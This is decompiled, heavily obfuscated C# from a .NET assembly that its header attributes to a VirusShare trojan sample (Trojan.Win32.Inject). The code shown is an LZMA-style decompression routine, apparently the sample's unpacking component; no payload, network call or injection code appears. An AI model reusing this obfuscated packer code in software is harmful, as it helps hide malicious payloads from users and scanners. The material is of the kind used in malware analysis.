// Decompiled with JetBrains decompiler
// Type:  
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 32BC53D7-A239-4C18-BE53-ECC907E1DE31
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Inject.edlb-0c8f225037e96d7ea9ccbcdb261d18fcd0563b2c1d3e6f324585b562d987ac19.exe

using System;
using System.IO;

public sealed class \u0008\u2000 : \u0003\u2000, \u0005\u2000
{
  private \u000F \u0002 = new \u000F();
  private \u0003\u2001 \u0003 = new \u0003\u2001();
  private \u0006\u2000[] \u0005 = new \u0006\u2000[new IntPtr(192)];
  private \u0006\u2000[] \u0008 = new \u0006\u2000[new IntPtr(12)];
  private \u0006\u2000[] \u0006 = new \u0006\u2000[new IntPtr(12)];
  private \u0006\u2000[] \u000E = new \u0006\u2000[new IntPtr(12)];
  private \u0006\u2000[] \u000F = new \u0006\u2000[new IntPtr(12)];
  private \u0006\u2000[] \u0002\u2000 = new \u0006\u2000[new IntPtr(192)];
  private \u000F\u2000[] \u0003\u2000 = new \u000F\u2000[new IntPtr(4)];
  private \u0006\u2000[] \u0005\u2000 = new \u0006\u2000[new IntPtr(114)];
  private \u000F\u2000 \u0008\u2000 = new \u000F\u2000(4);
  private \u0008\u2000.\u0002 \u0006\u2000 = new \u0008\u2000.\u0002();
  private \u0008\u2000.\u0002 \u000E\u2000 = new \u0008\u2000.\u0002();
  private \u0008\u2000.\u0003 \u000F\u2000 = new \u0008\u2000.\u0003();
  private uint \u0002\u2001;
  private uint \u0003\u2001;
  private uint \u0005\u2001;

  public \u0008\u2000()
  {
    this.\u0002\u2001 = uint.MaxValue;
    for (int index = 0; index < 4; ++index)
      this.\u0003\u2000[index] = new \u000F\u2000(6);
  }

  private void \u0002(uint _param1)
  {
    if ((int) this.\u0002\u2001 == (int) _param1)
      return;
    this.\u0002\u2001 = _param1;
    this.\u0003\u2001 = Math.Max(this.\u0002\u2001, 1U);
    this.\u0002.\u0002(Math.Max(this.\u0003\u2001, 4096U));
  }

  private void \u0002(int _param1, int _param2)
  {
    if (_param1 > 8)
      throw new \u000F\u2001();
    if (_param2 > 8)
      throw new \u000F\u2001();
    this.\u000F\u2000.\u0002(_param1, _param2);
  }

  private void \u0002(int _param1)
  {
    if (_param1 > 4)
      throw new \u000F\u2001();
    uint num = (uint) (1 << _param1);
    this.\u0006\u2000.\u0002(num);
    this.\u000E\u2000.\u0002(num);
    this.\u0005\u2001 = num - 1U;
  }

  private void \u0002(Stream _param1, Stream _param2)
  {
    this.\u0003.\u0002(_param1);
    this.\u0002.\u0002(_param2);
    for (uint index1 = 0; index1 < 12U; ++index1)
    {
      for (uint index2 = 0; index2 <= this.\u0005\u2001; ++index2)
      {
        uint index3 = (index1 << 4) + index2;
        this.\u0005[(IntPtr) index3].\u0002();
        this.\u0002\u2000[(IntPtr) index3].\u0002();
      }
      this.\u0008[(IntPtr) index1].\u0002();
      this.\u0006[(IntPtr) index1].\u0002();
      this.\u000E[(IntPtr) index1].\u0002();
      this.\u000F[(IntPtr) index1].\u0002();
    }
    this.\u000F\u2000.\u0002();
    for (uint index = 0; index < 4U; ++index)
      this.\u0003\u2000[(IntPtr) index].\u0002();
    for (uint index = 0; index < 114U; ++index)
      this.\u0005\u2000[(IntPtr) index].\u0002();
    this.\u0006\u2000.\u0002();
    this.\u000E\u2000.\u0002();
    this.\u0008\u2000.\u0002();
  }

  public void \u0003\u2000\u2004\u2006\u2008\u2002\u0002(
    Stream _param1,
    Stream _param2,
    long _param3,
    long _param4,
    \u000E\u2001 _param5)
  {
    this.\u0002(_param1, _param2);
    \u0002\u2000.\u0002 obj = new \u0002\u2000.\u0002();
    obj.\u0002();
    uint num1 = 0;
    uint num2 = 0;
    uint num3 = 0;
    uint num4 = 0;
    ulong num5 = 0;
    ulong num6 = (ulong) _param4;
    if (num5 < num6)
    {
      if (this.\u0005[(IntPtr) (obj.\u0002 << 4)].\u0002(this.\u0003) != 0U)
        throw new \u0006\u2001();
      obj.\u0003();
      this.\u0002.\u0002(this.\u000F\u2000.\u0002(this.\u0003, 0U, (byte) 0));
      ++num5;
    }
    while (num5 < num6)
    {
      uint num7 = (uint) num5 & this.\u0005\u2001;
      if (this.\u0005[(IntPtr) ((obj.\u0002 << 4) + num7)].\u0002(this.\u0003) == 0U)
      {
        byte num8 = this.\u0002.\u0002(0U);
        this.\u0002.\u0002(obj.\u0002() ? this.\u000F\u2000.\u0002(this.\u0003, (uint) num5, num8) : this.\u000F\u2000.\u0002(this.\u0003, (uint) num5, num8, this.\u0002.\u0002(num1)));
        obj.\u0003();
        ++num5;
      }
      else
      {
        uint num9;
        if (this.\u0008[(IntPtr) obj.\u0002].\u0002(this.\u0003) == 1U)
        {
          if (this.\u0006[(IntPtr) obj.\u0002].\u0002(this.\u0003) == 0U)
          {
            if (this.\u0002\u2000[(IntPtr) ((obj.\u0002 << 4) + num7)].\u0002(this.\u0003) == 0U)
            {
              obj.\u0006();
              this.\u0002.\u0002(this.\u0002.\u0002(num1));
              ++num5;
              continue;
            }
          }
          else
          {
            uint num10;
            if (this.\u000E[(IntPtr) obj.\u0002].\u0002(this.\u0003) == 0U)
            {
              num10 = num2;
            }
            else
            {
              if (this.\u000F[(IntPtr) obj.\u0002].\u0002(this.\u0003) == 0U)
              {
                num10 = num3;
              }
              else
              {
                num10 = num4;
                num4 = num3;
              }
              num3 = num2;
            }
            num2 = num1;
            num1 = num10;
          }
          num9 = this.\u000E\u2000.\u0002(this.\u0003, num7) + 2U;
          obj.\u0008();
        }
        else
        {
          num4 = num3;
          num3 = num2;
          num2 = num1;
          num9 = 2U + this.\u0006\u2000.\u0002(this.\u0003, num7);
          obj.\u0005();
          uint num11 = this.\u0003\u2000[(IntPtr) \u0002\u2000.\u0002(num9)].\u0002(this.\u0003);
          if (num11 >= 4U)
          {
            int num12 = (int) (num11 >> 1) - 1;
            uint num13 = (uint) ((2 | (int) num11 & 1) << num12);
            num1 = num11 >= 14U ? num13 + (this.\u0003.\u0002(num12 - 4) << 4) + this.\u0008\u2000.\u0003(this.\u0003) : num13 + \u000F\u2000.\u0002(this.\u0005\u2000, (uint) ((int) num13 - (int) num11 - 1), this.\u0003, num12);
          }
          else
            num1 = num11;
        }
        if ((ulong) num1 >= num5 || num1 >= this.\u0003\u2001)
        {
          if (num1 != uint.MaxValue)
            throw new \u0006\u2001();
          break;
        }
        this.\u0002.\u0002(num1, num9);
        num5 += (ulong) num9;
      }
    }
    this.\u0002.\u0003();
    this.\u0002.\u0002();
    this.\u0003.\u0002();
  }

  public void \u0005\u2000\u2004\u2006\u2008\u2002\u0002(byte[] _param1)
  {
    if (_param1.Length < 5)
      throw new \u000F\u2001();
    int num1 = (int) _param1[0] % 9;
    int num2 = (int) _param1[0] / 9;
    int num3 = num2 % 5;
    int num4 = num2 / 5;
    if (num4 > 4)
      throw new \u000F\u2001();
    uint num5 = 0;
    for (int index = 0; index < 4; ++index)
      num5 += (uint) _param1[1 + index] << index * 8;
    this.\u0002(num5);
    this.\u0002(num3, num1);
    this.\u0002(num4);
  }

  private sealed class \u0002
  {
    private \u0006\u2000 \u0002 = new \u0006\u2000();
    private \u0006\u2000 \u0003 = new \u0006\u2000();
    private \u000F\u2000[] \u0005 = new \u000F\u2000[new IntPtr(16)];
    private \u000F\u2000[] \u0008 = new \u000F\u2000[new IntPtr(16)];
    private \u000F\u2000 \u0006 = new \u000F\u2000(8);
    private uint \u000E;

    public void \u0002(uint _param1)
    {
      for (uint index = this.\u000E; index < _param1; ++index)
      {
        this.\u0005[(IntPtr) index] = new \u000F\u2000(3);
        this.\u0008[(IntPtr) index] = new \u000F\u2000(3);
      }
      this.\u000E = _param1;
    }

    public void \u0002()
    {
      this.\u0002.\u0002();
      for (uint index = 0; index < this.\u000E; ++index)
      {
        this.\u0005[(IntPtr) index].\u0002();
        this.\u0008[(IntPtr) index].\u0002();
      }
      this.\u0003.\u0002();
      this.\u0006.\u0002();
    }

    public uint \u0002(\u0003\u2001 _param1, uint _param2)
    {
      if (this.\u0002.\u0002(_param1) == 0U)
        return this.\u0005[(IntPtr) _param2].\u0002(_param1);
      uint num = 8;
      return this.\u0003.\u0002(_param1) != 0U ? num + 8U + this.\u0006.\u0002(_param1) : num + this.\u0008[(IntPtr) _param2].\u0002(_param1);
    }
  }

  private sealed class \u0003
  {
    private \u0008\u2000.\u0003.\u0002[] \u0002;
    private int \u0003;
    private int \u0005;
    private uint \u0008;

    public void \u0002(int _param1, int _param2)
    {
      if (this.\u0002 != null && this.\u0003 == _param2 && this.\u0005 == _param1)
        return;
      this.\u0005 = _param1;
      this.\u0008 = (uint) ((1 << _param1) - 1);
      this.\u0003 = _param2;
      uint length = (uint) (1 << this.\u0003 + this.\u0005);
      this.\u0002 = new \u0008\u2000.\u0003.\u0002[(IntPtr) length];
      for (uint index = 0; index < length; ++index)
        this.\u0002[(IntPtr) index].\u0002();
    }

    public void \u0002()
    {
      uint num = (uint) (1 << this.\u0003 + this.\u0005);
      for (uint index = 0; index < num; ++index)
        this.\u0002[(IntPtr) index].\u0003();
    }

    private uint \u0002(uint _param1, byte _param2) => (uint) ((((int) _param1 & (int) this.\u0008) << this.\u0003) + ((int) _param2 >> 8 - this.\u0003));

    public byte \u0002(\u0003\u2001 _param1, uint _param2, byte _param3) => this.\u0002[(IntPtr) this.\u0002(_param2, _param3)].\u0002(_param1);

    public byte \u0002(\u0003\u2001 _param1, uint _param2, byte _param3, byte _param4) => this.\u0002[(IntPtr) this.\u0002(_param2, _param3)].\u0002(_param1, _param4);

    private struct \u0002
    {
      private \u0006\u2000[] \u0002;

      public void \u0002() => this.\u0002 = new \u0006\u2000[768];

      public void \u0003()
      {
        for (int index = 0; index < 768; ++index)
          this.\u0002[index].\u0002();
      }

      public byte \u0002(\u0003\u2001 _param1)
      {
        uint index = 1;
        do
        {
          index = index << 1 | this.\u0002[(IntPtr) index].\u0002(_param1);
        }
        while (index < 256U);
        return (byte) index;
      }

      public byte \u0002(\u0003\u2001 _param1, byte _param2)
      {
        uint index = 1;
        do
        {
          uint num1 = (uint) ((int) _param2 >> 7 & 1);
          _param2 <<= 1;
          uint num2 = this.\u0002[(IntPtr) ((uint) (1 + (int) num1 << 8) + index)].\u0002(_param1);
          index = index << 1 | num2;
          if ((int) num1 != (int) num2)
          {
            while (index < 256U)
              index = index << 1 | this.\u0002[(IntPtr) index].\u0002(_param1);
            break;
          }
        }
        while (index < 256U);
        return (byte) index;
      }
    }
  }
}
